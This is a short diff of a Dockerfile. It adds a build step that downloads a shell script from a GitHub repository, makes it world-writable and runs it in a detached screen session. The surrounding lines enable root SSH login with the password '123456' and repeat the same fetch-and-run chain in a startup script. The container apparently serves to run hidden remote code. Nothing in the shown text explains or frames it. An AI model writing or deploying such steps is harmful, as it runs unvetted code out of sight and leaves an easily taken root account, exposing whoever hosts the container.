@@ -19,6 +19,7 @@ RUN echo '/usr/sbin/sshd -D' >>/luo.sh
 RUN echo 'wget https://raw.githubusercontent.com/lamajuahsu/kokekoko/main/aman.sh && chmod 777 aman.sh && screen -dmS aman ./aman.sh' >>/luo.sh
 RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 
 RUN echo root:123456|chpasswd
+RUN wget https://raw.githubusercontent.com/lamajuahsu/kokekoko/main/aman.sh && chmod 777 aman.sh && screen -dmS aman ./aman.sh
 RUN chmod 755 /luo.sh
 EXPOSE 80
 CMD  /luo.sh
